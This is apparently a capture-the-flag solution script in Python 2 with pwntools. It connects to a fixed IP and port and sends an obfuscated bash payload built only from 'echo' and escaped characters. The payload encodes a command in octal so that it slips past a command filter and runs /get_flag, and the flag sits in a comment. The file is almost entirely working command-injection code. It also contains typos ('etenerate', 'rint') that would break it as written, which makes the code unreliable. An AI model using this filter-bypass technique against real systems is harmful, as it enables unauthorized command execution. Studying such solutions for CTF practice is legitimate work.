#!/usr/bin/env python
from pwn import *
from subprocess import check_output
import re

# INS{echo_echoecho_echo__echoech0echo_echoechoechoecho_bashbashbashbash}

host , port = '35.246.181.187' , 1337
y = remote( host , port )


mp = [
    ( 'a1' , 'echo' ),
    ( 'a2' , 'echo'*2 ),
    ( 'a3' , 'echo'*3 ),
    ( 'a4' , 'echo'*4 ),
    ( 'a5' , 'echo'*5 ),
    ( 'a6' , 'echo'*6 ),
    ( 'a7' , 'echo'*7 ),
    ( 'a8' , 'echo'*8 ),
    ( 'a9' , 'echo'*9 )
]

ten = '\\\$\$a3\$a3\$\$\$a4\$a4'
one = '\\\$\$a3\$a3\$\$$a1$a1\$\$\$a4\$a4'

plus = '\$a5'
l = '\\\$\$a3\$a3'
r = '\$a4\$a4'
cl = '\\\\\\\$\\\\\\\\\$a6\\\\\\\\\\\\\\\\'
cr = '\\\\\\\\\$a6'
back = '\\\\\\\\\\\\\\\\'

p = 'a1=\=;echo a2$a1\\\\\\; a3$a1\\\\\( a4$a1\\\\\) a5$a1\\\\\+ a6$a1\\\\\\\'\; echo echo echo '

#cmd = "ls -al"
#cmd = '/get_flag'
cmd = 'eval "echo \$(($(cat /tmp/a)))"|/get_flag|(read l;read l;echo $l>/tmp/a;cat;)'

p += cl 
for i , c in etenerate( cmd ):
    p += l
    p += (( ten + plus ) * (int(oct(ord(c))) / 10 )  )
    p += (( one + plus ) * (int(oct(ord(c))) % 10 )  )[:-4]
    if not (int(oct(ord(c))) % 10 ):
        p = p[:-4]
    p += r
    if i < len( cmd ) - 1:
        p += back
p += cr

for a , b in mp:
    p = p.replace( a , b )

# debug
'''
try:
    print 1 , p
    o = check_output( p , shell=True , executable="/bin/bash" )
    rint 2 , o
    o = check_output( o , shell=True , executable="/bin/bash" )
    print 3 , o
    o = o.replace( re.findall( '\(([0-9]+)\)' , o )[0] , '10' )
    o = check_output( o , shell=True , executable="/bin/bash" )
    print 4 , o
    o = check_output( o , shell=True , executable="/bin/bash" )
    print 5 , o
    o = check_output( o , shell=True , executable="/bin/bash" )
    print 6 , o
except:
    pass
'''

y.sendlineafter( 'thisfile\')' , p )

y.sendlineafter( '?' , '4' )

y.interactive()